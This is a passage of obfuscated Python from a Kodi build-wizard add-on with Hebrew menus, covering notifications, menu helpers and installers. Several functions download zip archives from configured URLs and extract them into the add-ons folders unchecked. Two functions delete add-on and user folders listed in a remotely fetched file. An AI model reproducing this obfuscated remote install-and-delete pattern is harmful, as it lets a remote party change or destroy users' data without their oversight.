						wiz .setS ("notedismiss","true")#line:5152
						if O00O0O0OOO000O0OO ==OO0000O00000OO0O0 :#line:5153
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O00O0O0OOO000O0OO ),xbmc .LOGNOTICE )#line:5154
						elif O00O0O0OOO000O0OO >OO0000O00000OO0O0 :#line:5156
							wiz .log ("[Notifications] id: %s"%str (O00O0O0OOO000O0OO ),xbmc .LOGNOTICE )#line:5157
							wiz .setS ('noteid',str (O00O0O0OOO000O0OO ))#line:5158
							wiz .setS ("notedismiss","true")#line:5159
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5162
					except Exception as OO0000O000OOOO000 :#line:5163
						wiz .log ("Error on Notifications Window: %s"%str (OO0000O000OOOO000 ),xbmc .LOGERROR )#line:5164
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5166
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O000000OOOOOOOO ),xbmc .LOGNOTICE )#line:5167
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5168
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5169
def checkidupdate ():#line:5175
				wiz .setS ("notedismiss","true")#line:5177
				OOOO0O0OO0O000O00 =wiz .workingURL (NOTIFICATION )#line:5178
				OO0OO0000000OOO0O =" Kodi Premium"#line:5180
				O000OOOO00O00OO0O =wiz .checkBuild (OO0OO0000000OOO0O ,'gui')#line:5181
				OOO0O0OOO0OO0O00O =OO0OO0000000OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5182
				if not wiz .workingURL (O000OOOO00O00OO0O )==True :return #line:5183
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5184
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OO0000000OOO0O ),'','אנא המתן')#line:5185
				OO0OO000O0000OO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0OOO0OO0O00O )#line:5186
				try :os .remove (OO0OO000O0000OO0O )#line:5187
				except :pass #line:5188
				logging .warning (O000OOOO00O00OO0O )#line:5189
				if 'google'in O000OOOO00O00OO0O :#line:5190
				   O0O00O000000O0OOO =googledrive_download (O000OOOO00O00OO0O ,OO0OO000O0000OO0O ,DP ,wiz .checkBuild (OO0OO0000000OOO0O ,'filesize'))#line:5191
				else :#line:5194
				  downloader .download (O000OOOO00O00OO0O ,OO0OO000O0000OO0O ,DP )#line:5195
				xbmc .sleep (100 )#line:5196
				OOO00OOO000OOO00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0000000OOO0O )#line:5197
				DP .update (0 ,OOO00OOO000OOO00O ,'','אנא המתן')#line:5198
				extract .all (OO0OO000O0000OO0O ,HOME ,DP ,title =OOO00OOO000OOO00O )#line:5199
				DP .close ()#line:5200
				wiz .defaultSkin ()#line:5201
				wiz .lookandFeelData ('save')#line:5202
				if KODIV >=18 :#line:5203
					skindialogsettind18 ()#line:5204
				if INSTALLMETHOD ==1 :O0000O0O00O0OOOOO =1 #line:5207
				elif INSTALLMETHOD ==2 :O0000O0O00O0OOOOO =0 #line:5208
				else :DP .close ()#line:5209
def gaiaserenaddon ():#line:5211
  O0O0OO0000OO0OO00 =(ADDON .getSetting ("gaiaseren"))#line:5212
  OO000OOO0OO0O0O00 =(ADDON .getSetting ("auto_rd"))#line:5213
  if O0O0OO0000OO0OO00 =='true'and OO000OOO0OO0O0O00 =='true':#line:5214
    OO0O0OOOO0000OOO0 =(NEWFASTUPDATE )#line:5215
    O00OO00O0O000OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5216
    O0OOOOO000O0O0O0O =xbmcgui .DialogProgress ()#line:5217
    O0OOOOO000O0O0O0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5218
    O000OO00OO000O000 =os .path .join (PACKAGES ,'isr.zip')#line:5219
    O0O000O000O0O00OO =urllib2 .Request (OO0O0OOOO0000OOO0 )#line:5220
    OO0OO000O00OOO0OO =urllib2 .urlopen (O0O000O000O0O00OO )#line:5221
    O0O0000OO00OOO00O =xbmcgui .DialogProgress ()#line:5223
    O0O0000OO00OOO00O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5224
    O0O0000OO00OOO00O .update (0 )#line:5225
    OOOOOOOO00O0OO00O =open (O000OO00OO000O000 ,'wb')#line:5227
    try :#line:5229
      OOO00OOOOO0OO0O00 =OO0OO000O00OOO0OO .info ().getheader ('Content-Length').strip ()#line:5230
      OOO0000OO0000O0OO =True #line:5231
    except AttributeError :#line:5232
          OOO0000OO0000O0OO =False #line:5233
    if OOO0000OO0000O0OO :#line:5235
          OOO00OOOOO0OO0O00 =int (OOO00OOOOO0OO0O00 )#line:5236
    OO0OOO000O00O0000 =0 #line:5238
    O000O0OO0OOOOO00O =time .time ()#line:5239
    while True :#line:5240
          O00O00O000000O000 =OO0OO000O00OOO0OO .read (8192 )#line:5241
          if not O00O00O000000O000 :#line:5242
              sys .stdout .write ('\n')#line:5243
              break #line:5244
          OO0OOO000O00O0000 +=len (O00O00O000000O000 )#line:5246
          OOOOOOOO00O0OO00O .write (O00O00O000000O000 )#line:5247
          if not OOO0000OO0000O0OO :#line:5249
              OOO00OOOOO0OO0O00 =OO0OOO000O00O0000 #line:5250
          if O0O0000OO00OOO00O .iscanceled ():#line:5251
             O0O0000OO00OOO00O .close ()#line:5252
             try :#line:5253
              os .remove (O000OO00OO000O000 )#line:5254
             except :#line:5255
              pass #line:5256
             break #line:5257
          O0OOOOO0OOOO0O000 =float (OO0OOO000O00O0000 )/OOO00OOOOO0OO0O00 #line:5258
          O0OOOOO0OOOO0O000 =round (O0OOOOO0OOOO0O000 *100 ,2 )#line:5259
          O0OO0O0OOO0O0O00O =OO0OOO000O00O0000 /(1024 *1024 )#line:5260
          O000OO0OOOO0OO000 =OOO00OOOOO0OO0O00 /(1024 *1024 )#line:5261
          OOO00O0000O0OOOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0O0OOO0O0O00O ,'teal',O000OO0OOOO0OO000 )#line:5262
          if (time .time ()-O000O0OO0OOOOO00O )>0 :#line:5263
            OOOOO00O0O0O0O0OO =OO0OOO000O00O0000 /(time .time ()-O000O0OO0OOOOO00O )#line:5264
            OOOOO00O0O0O0O0OO =OOOOO00O0O0O0O0OO /1024 #line:5265
          else :#line:5266
           OOOOO00O0O0O0O0OO =0 #line:5267
          OO00O00O00O00OO0O ='KB'#line:5268
          if OOOOO00O0O0O0O0OO >=1024 :#line:5269
             OOOOO00O0O0O0O0OO =OOOOO00O0O0O0O0OO /1024 #line:5270
             OO00O00O00O00OO0O ='MB'#line:5271
          if OOOOO00O0O0O0O0OO >0 and not O0OOOOO0OOOO0O000 ==100 :#line:5272
              OO00O0O0OOOOO00O0 =(OOO00OOOOO0OO0O00 -OO0OOO000O00O0000 )/OOOOO00O0O0O0O0OO #line:5273
          else :#line:5274
              OO00O0O0OOOOO00O0 =0 #line:5275
          OOO0O00O00OO0O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO00O0O0O0O0OO ,OO00O00O00O00OO0O )#line:5276
          O0O0000OO00OOO00O .update (int (O0OOOOO0OOOO0O000 ),OOO00O0000O0OOOO0 ,OOO0O00O00OO0O0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5278
    O00OO00O00000O000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5281
    OOOOOOOO00O0OO00O .close ()#line:5284
    extract .all (O000OO00OO000O000 ,O00OO00O00000O000 ,O0O0000OO00OOO00O )#line:5285
    try :#line:5289
      os .remove (O000OO00OO000O000 )#line:5290
    except :#line:5291
      pass #line:5292
def iptvsimpldownpc ():#line:5293
    OO0OO000OO0O0O0OO =(IPTVSIMPL18PC )#line:5295
    OO0O00OO0OO00OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5296
    OO0O0O0OOO0O0O000 =xbmcgui .DialogProgress ()#line:5297
    OO0O0O0OOO0O0O000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5298
    OOO00OOO0000O00O0 =os .path .join (PACKAGES ,'isr.zip')#line:5299
    O0O0O00OO0OO0O00O =urllib2 .Request (OO0OO000OO0O0O0OO )#line:5300
    O000O0O00OOOOOO00 =urllib2 .urlopen (O0O0O00OO0OO0O00O )#line:5301
    OOOOOO0O00000O0OO =xbmcgui .DialogProgress ()#line:5303
    OOOOOO0O00000O0OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5304
    OOOOOO0O00000O0OO .update (0 )#line:5305
    OOOOOOO0000O0OOO0 =open (OOO00OOO0000O00O0 ,'wb')#line:5307
    try :#line:5309
      OOOO000OO0O00OO0O =O000O0O00OOOOOO00 .info ().getheader ('Content-Length').strip ()#line:5310
      O0OO00OO0O0OOOO0O =True #line:5311
    except AttributeError :#line:5312
          O0OO00OO0O0OOOO0O =False #line:5313
    if O0OO00OO0O0OOOO0O :#line:5315
          OOOO000OO0O00OO0O =int (OOOO000OO0O00OO0O )#line:5316
    O000OO000O0OOOOOO =0 #line:5318
    O000O0O0O0OOOO0O0 =time .time ()#line:5319
    while True :#line:5320
          O00O0O0OO0O0OO0O0 =O000O0O00OOOOOO00 .read (8192 )#line:5321
          if not O00O0O0OO0O0OO0O0 :#line:5322
              sys .stdout .write ('\n')#line:5323
              break #line:5324
          O000OO000O0OOOOOO +=len (O00O0O0OO0O0OO0O0 )#line:5326
          OOOOOOO0000O0OOO0 .write (O00O0O0OO0O0OO0O0 )#line:5327
          if not O0OO00OO0O0OOOO0O :#line:5329
              OOOO000OO0O00OO0O =O000OO000O0OOOOOO #line:5330
          if OOOOOO0O00000O0OO .iscanceled ():#line:5331
             OOOOOO0O00000O0OO .close ()#line:5332
             try :#line:5333
              os .remove (OOO00OOO0000O00O0 )#line:5334
             except :#line:5335
              pass #line:5336
             break #line:5337
          O000000000OOO0OO0 =float (O000OO000O0OOOOOO )/OOOO000OO0O00OO0O #line:5338
          O000000000OOO0OO0 =round (O000000000OOO0OO0 *100 ,2 )#line:5339
          OOO0O0OO0OOO0OOOO =O000OO000O0OOOOOO /(1024 *1024 )#line:5340
          O00O0O00OOOO00OO0 =OOOO000OO0O00OO0O /(1024 *1024 )#line:5341
          O0OO0OO000OO000OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O0OO0OOO0OOOO ,'teal',O00O0O00OOOO00OO0 )#line:5342
          if (time .time ()-O000O0O0O0OOOO0O0 )>0 :#line:5343
            O00OOO00O0000O000 =O000OO000O0OOOOOO /(time .time ()-O000O0O0O0OOOO0O0 )#line:5344
            O00OOO00O0000O000 =O00OOO00O0000O000 /1024 #line:5345
          else :#line:5346
           O00OOO00O0000O000 =0 #line:5347
          OOO000O0OO0O0OOOO ='KB'#line:5348
          if O00OOO00O0000O000 >=1024 :#line:5349
             O00OOO00O0000O000 =O00OOO00O0000O000 /1024 #line:5350
             OOO000O0OO0O0OOOO ='MB'#line:5351
          if O00OOO00O0000O000 >0 and not O000000000OOO0OO0 ==100 :#line:5352
              OO00OOOOO0O0OO0OO =(OOOO000OO0O00OO0O -O000OO000O0OOOOOO )/O00OOO00O0000O000 #line:5353
          else :#line:5354
              OO00OOOOO0O0OO0OO =0 #line:5355
          OO000OOOOOO0OOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOO00O0000O000 ,OOO000O0OO0O0OOOO )#line:5356
          OOOOOO0O00000O0OO .update (int (O000000000OOO0OO0 ),O0OO0OO000OO000OO ,OO000OOOOOO0OOOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5358
    O0OO0O0OO0O000OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5361
    OOOOOOO0000O0OOO0 .close ()#line:5364
    extract .all (OOO00OOO0000O00O0 ,O0OO0O0OO0O000OOO ,OOOOOO0O00000O0OO )#line:5365
    try :#line:5369
      os .remove (OOO00OOO0000O00O0 )#line:5370
    except :#line:5371
      pass #line:5372
def iptvsimpldown ():#line:5373
    OO00O0O00O0O0O000 =(IPTV18 )#line:5375
    OO0OOOOO0OO0OOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5376
    O00OOOOOO0OO0O0O0 =xbmcgui .DialogProgress ()#line:5377
    O00OOOOOO0OO0O0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5378
    O00O0O00OO0000O0O =os .path .join (PACKAGES ,'isr.zip')#line:5379
    OO0OO0OOOOO0OO000 =urllib2 .Request (OO00O0O00O0O0O000 )#line:5380
    OO00000O00O0OO0O0 =urllib2 .urlopen (OO0OO0OOOOO0OO000 )#line:5381
    OO00OOOO000OOOO00 =xbmcgui .DialogProgress ()#line:5383
    OO00OOOO000OOOO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5384
    OO00OOOO000OOOO00 .update (0 )#line:5385
    OOOOO00000OO000OO =open (O00O0O00OO0000O0O ,'wb')#line:5387
    try :#line:5389
      OO00OOOOO0000OO00 =OO00000O00O0OO0O0 .info ().getheader ('Content-Length').strip ()#line:5390
      O00OOO0OO0O0O0O0O =True #line:5391
    except AttributeError :#line:5392
          O00OOO0OO0O0O0O0O =False #line:5393
    if O00OOO0OO0O0O0O0O :#line:5395
          OO00OOOOO0000OO00 =int (OO00OOOOO0000OO00 )#line:5396
    O00000O0O0OO0O0OO =0 #line:5398
    O000O0O0O0O0O0000 =time .time ()#line:5399
    while True :#line:5400
          O00OOO0OO000O000O =OO00000O00O0OO0O0 .read (8192 )#line:5401
          if not O00OOO0OO000O000O :#line:5402
              sys .stdout .write ('\n')#line:5403
              break #line:5404
          O00000O0O0OO0O0OO +=len (O00OOO0OO000O000O )#line:5406
          OOOOO00000OO000OO .write (O00OOO0OO000O000O )#line:5407
          if not O00OOO0OO0O0O0O0O :#line:5409
              OO00OOOOO0000OO00 =O00000O0O0OO0O0OO #line:5410
          if OO00OOOO000OOOO00 .iscanceled ():#line:5411
             OO00OOOO000OOOO00 .close ()#line:5412
             try :#line:5413
              os .remove (O00O0O00OO0000O0O )#line:5414
             except :#line:5415
              pass #line:5416
             break #line:5417
          OO000OOOOO0O0O0OO =float (O00000O0O0OO0O0OO )/OO00OOOOO0000OO00 #line:5418
          OO000OOOOO0O0O0OO =round (OO000OOOOO0O0O0OO *100 ,2 )#line:5419
          OO00OOOOOOO0000O0 =O00000O0O0OO0O0OO /(1024 *1024 )#line:5420
          OO00O0O000O0O0O00 =OO00OOOOO0000OO00 /(1024 *1024 )#line:5421
          O00O0000OO00O0OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OOOOOOO0000O0 ,'teal',OO00O0O000O0O0O00 )#line:5422
          if (time .time ()-O000O0O0O0O0O0000 )>0 :#line:5423
            O0OO0OO00OO00O0OO =O00000O0O0OO0O0OO /(time .time ()-O000O0O0O0O0O0000 )#line:5424
            O0OO0OO00OO00O0OO =O0OO0OO00OO00O0OO /1024 #line:5425
          else :#line:5426
           O0OO0OO00OO00O0OO =0 #line:5427
          O000O0OOOOOO0OO0O ='KB'#line:5428
          if O0OO0OO00OO00O0OO >=1024 :#line:5429
             O0OO0OO00OO00O0OO =O0OO0OO00OO00O0OO /1024 #line:5430
             O000O0OOOOOO0OO0O ='MB'#line:5431
          if O0OO0OO00OO00O0OO >0 and not OO000OOOOO0O0O0OO ==100 :#line:5432
              O0O0O0O0000000000 =(OO00OOOOO0000OO00 -O00000O0O0OO0O0OO )/O0OO0OO00OO00O0OO #line:5433
          else :#line:5434
              O0O0O0O0000000000 =0 #line:5435
          OOOO000000O00OOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0OO00OO00O0OO ,O000O0OOOOOO0OO0O )#line:5436
          OO00OOOO000OOOO00 .update (int (OO000OOOOO0O0O0OO ),O00O0000OO00O0OOO ,OOOO000000O00OOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5438
    O0O0OO00OOO0O0000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5441
    OOOOO00000OO000OO .close ()#line:5444
    extract .all (O00O0O00OO0000O0O ,O0O0OO00OOO0O0000 ,OO00OOOO000OOOO00 )#line:5445
    try :#line:5449
      os .remove (O00O0O00OO0000O0O )#line:5450
    except :#line:5451
      pass #line:5452
def testnotify ():#line:5453
	OOO0O0OO0O0O0O0OO =wiz .workingURL (NOTIFICATION )#line:5454
	if OOO0O0OO0O0O0O0OO ==True :#line:5455
		try :#line:5456
			O000OOOOO0000O0OO ,OOO0O000O0000000O =wiz .splitNotify (NOTIFICATION )#line:5457
			if O000OOOOO0000O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5458
			if STARTP2 ()=='ok':#line:5459
				notify .notification (OOO0O000O0000000O ,True )#line:5460
		except Exception as OOOOO0O000O0OOOOO :#line:5461
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO0O000O0OOOOO ),xbmc .LOGERROR )#line:5462
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5463
def testnotify2 ():#line:5464
	O00OOO0O000OO0O00 =wiz .workingURL (NOTIFICATION2 )#line:5465
	if O00OOO0O000OO0O00 ==True :#line:5466
		try :#line:5467
			OOO0O0O0OOO00O0OO ,O00O00OOO0O0OO000 =wiz .splitNotify (NOTIFICATION2 )#line:5468
			if OOO0O0O0OOO00O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5469
			if STARTP2 ()=='ok':#line:5470
				notify .notification2 (O00O00OOO0O0OO000 ,True )#line:5471
		except Exception as O00O00O0O0O00O000 :#line:5472
			wiz .log ("Error on Notifications Window: %s"%str (O00O00O0O0O00O000 ),xbmc .LOGERROR )#line:5473
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5474
def testnotify3 ():#line:5475
	OOOOO00O0O0OOOO00 =wiz .workingURL (NOTIFICATION3 )#line:5476
	if OOOOO00O0O0OOOO00 ==True :#line:5477
		try :#line:5478
			O0O0O00OOO0000OO0 ,OOO00OOOO0O00OOO0 =wiz .splitNotify (NOTIFICATION3 )#line:5479
			if O0O0O00OOO0000OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5480
			if STARTP2 ()=='ok':#line:5481
				notify .notification3 (OOO00OOOO0O00OOO0 ,True )#line:5482
		except Exception as O0O0OO0O00OOOOO0O :#line:5483
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OO0O00OOOOO0O ),xbmc .LOGERROR )#line:5484
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5485
def infobuild ():#line:5486
	OO0OOOO00O00O0OO0 =wiz .workingURL (NOTIFICATION )#line:5487
	if OO0OOOO00O00O0OO0 ==True :#line:5488
		try :#line:5489
			OOO00OO0O0O0O0O0O ,OOOO000000O0OO0OO =wiz .splitNotify (NOTIFICATION )#line:5490
			if OOO00OO0O0O0O0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5491
			if STARTP2 ()=='ok':#line:5492
				notify .updateinfo (OOOO000000O0OO0OO ,True )#line:5493
		except Exception as OOO00OO00OOO000O0 :#line:5494
			wiz .log ("Error on Notifications Window: %s"%str (OOO00OO00OOO000O0 ),xbmc .LOGERROR )#line:5495
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5496
def servicemanual ():#line:5497
	O00OO0OOOO0O0O0OO =wiz .workingURL (HELPINFO )#line:5498
	if O00OO0OOOO0O0O0OO ==True :#line:5499
		try :#line:5500
			OO000OO0O0O0O00O0 ,OO0OOOO00OOOOOO0O =wiz .splitNotify (HELPINFO )#line:5501
			if OO000OO0O0O0O00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5502
			notify .helpinfo (OO0OOOO00OOOOOO0O ,True )#line:5503
		except Exception as O00O00OO000O0OOO0 :#line:5504
			wiz .log ("Error on Notifications Window: %s"%str (O00O00OO000O0OOO0 ),xbmc .LOGERROR )#line:5505
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5506
def testupdate ():#line:5508
	if BUILDNAME =="":#line:5509
		notify .updateWindow ()#line:5510
	else :#line:5511
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5512
def testfirst ():#line:5514
	notify .firstRun ()#line:5515
def testfirstRun ():#line:5517
	notify .firstRunSettings ()#line:5518
def fastinstall ():#line:5521
	notify .firstRuninstall ()#line:5522
def addDir (OOOO0O00O0000000O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5529
	O0OO0000O000O0000 =sys .argv [0 ]#line:5530
	if not mode ==None :O0OO0000O000O0000 +="?mode=%s"%urllib .quote_plus (mode )#line:5531
	if not name ==None :O0OO0000O000O0000 +="&name="+urllib .quote_plus (name )#line:5532
	if not url ==None :O0OO0000O000O0000 +="&url="+urllib .quote_plus (url )#line:5533
	O0O000OO0OO00OOO0 =True #line:5534
	if themeit :OOOO0O00O0000000O =themeit %OOOO0O00O0000000O #line:5535
	OOOO0000O00O00O0O =xbmcgui .ListItem (OOOO0O00O0000000O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5536
	OOOO0000O00O00O0O .setInfo (type ="Video",infoLabels ={"Title":OOOO0O00O0000000O ,"Plot":description })#line:5537
	OOOO0000O00O00O0O .setProperty ("Fanart_Image",fanart )#line:5538
	if not menu ==None :OOOO0000O00O00O0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5539
	O0O000OO0OO00OOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO0000O000O0000 ,listitem =OOOO0000O00O00O0O ,isFolder =True )#line:5540
	return O0O000OO0OO00OOO0 #line:5541
def addFile (OOO00OO0O0OOO0OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5543
	OO0O0000000O0OO0O =sys .argv [0 ]#line:5544
	if not mode ==None :OO0O0000000O0OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5545
	if not name ==None :OO0O0000000O0OO0O +="&name="+urllib .quote_plus (name )#line:5546
	if not url ==None :OO0O0000000O0OO0O +="&url="+urllib .quote_plus (url )#line:5547
	OOOOO00OO00OOO000 =True #line:5548
	if themeit :OOO00OO0O0OOO0OOO =themeit %OOO00OO0O0OOO0OOO #line:5549
	OO0O0O0OOO00OO00O =xbmcgui .ListItem (OOO00OO0O0OOO0OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5550
	OO0O0O0OOO00OO00O .setInfo (type ="Video",infoLabels ={"Title":OOO00OO0O0OOO0OOO ,"Plot":description })#line:5551
	OO0O0O0OOO00OO00O .setProperty ("Fanart_Image",fanart )#line:5552
	if not menu ==None :OO0O0O0OOO00OO00O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5553
	OOOOO00OO00OOO000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O0000000O0OO0O ,listitem =OO0O0O0OOO00OO00O ,isFolder =False )#line:5554
	return OOOOO00OO00OOO000 #line:5555
def get_params ():#line:5557
	O00O00OO0O0OO00OO =[]#line:5558
	O00O0O0OO00OOOOO0 =sys .argv [2 ]#line:5559
	if len (O00O0O0OO00OOOOO0 )>=2 :#line:5560
		O0OOOO000O00OOO00 =sys .argv [2 ]#line:5561
		OO0OOOOOO0OOOO0OO =O0OOOO000O00OOO00 .replace ('?','')#line:5562
		if (O0OOOO000O00OOO00 [len (O0OOOO000O00OOO00 )-1 ]=='/'):#line:5563
			O0OOOO000O00OOO00 =O0OOOO000O00OOO00 [0 :len (O0OOOO000O00OOO00 )-2 ]#line:5564
		OOOO0OO0O0O000000 =OO0OOOOOO0OOOO0OO .split ('&')#line:5565
		O00O00OO0O0OO00OO ={}#line:5566
		for OOOO00OO0O00000OO in range (len (OOOO0OO0O0O000000 )):#line:5567
			OO0O000OO0OO0OOOO ={}#line:5568
			OO0O000OO0OO0OOOO =OOOO0OO0O0O000000 [OOOO00OO0O00000OO ].split ('=')#line:5569
			if (len (OO0O000OO0OO0OOOO ))==2 :#line:5570
				O00O00OO0O0OO00OO [OO0O000OO0OO0OOOO [0 ]]=OO0O000OO0OO0OOOO [1 ]#line:5571
		return O00O00OO0O0OO00OO #line:5573
def remove_addons ():#line:5575
	try :#line:5576
			import json #line:5577
			O0OOO0000O0OO000O =urllib2 .urlopen (remove_url ).readlines ()#line:5578
			for O000O0O0OOOO0OOOO in O0OOO0000O0OO000O :#line:5579
				O0OO0O0O00O0O0OOO =O000O0O0OOOO0OOOO .split (':')[1 ].strip ()#line:5581
				O0O0000OO0O0000OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0OO0O0O00O0O0OOO ,'false')#line:5582
				OO0O0O0OOOOOO0OOO =xbmc .executeJSONRPC (O0O0000OO0O0000OO )#line:5583
				OO0OO000000O00O0O =json .loads (OO0O0O0OOOOOO0OOO )#line:5584
				O0O0OO0OOOOO0OO0O =os .path .join (addons_folder ,O0OO0O0O00O0O0OOO )#line:5586
				if os .path .exists (O0O0OO0OOOOO0OO0O ):#line:5588
					for OOO0OOOOO0OO0OO0O ,O0O000OO000OOO0O0 ,OO00O00O00OO0OOO0 in os .walk (O0O0OO0OOOOO0OO0O ):#line:5589
						for OOOOO0OO00OOO00OO in OO00O00O00OO0OOO0 :#line:5590
							os .unlink (os .path .join (OOO0OOOOO0OO0OO0O ,OOOOO0OO00OOO00OO ))#line:5591
						for O0O0000OO000000O0 in O0O000OO000OOO0O0 :#line:5592
							shutil .rmtree (os .path .join (OOO0OOOOO0OO0OO0O ,O0O0000OO000000O0 ))#line:5593
					os .rmdir (O0O0OO0OOOOO0OO0O )#line:5594
			xbmc .executebuiltin ('Container.Refresh')#line:5596
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5597
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5598
	except :pass #line:5599
def remove_addons2 ():#line:5600
	try :#line:5601
			import json #line:5602
			O0000OOO00OOOO00O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5603
			for OOO000OO0OO0O0OOO in O0000OOO00OOOO00O :#line:5604
				O000O0000000OO000 =OOO000OO0OO0O0OOO .split (':')[1 ].strip ()#line:5606
				O0OOOOO0OO0O000OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O000O0000000OO000 ,'false')#line:5607
				OO0OOO0O000O0OOO0 =xbmc .executeJSONRPC (O0OOOOO0OO0O000OO )#line:5608
				OOO000O000O0O0O00 =json .loads (OO0OOO0O000O0OOO0 )#line:5609
				O0OO00OOO0O000000 =os .path .join (user_folder ,O000O0000000OO000 )#line:5611
				if os .path .exists (O0OO00OOO0O000000 ):#line:5613
					for O00OO00OOOO0O0000 ,OOO00O000OOO0O000 ,OO00OO0OOOO0OO0O0 in os .walk (O0OO00OOO0O000000 ):#line:5614
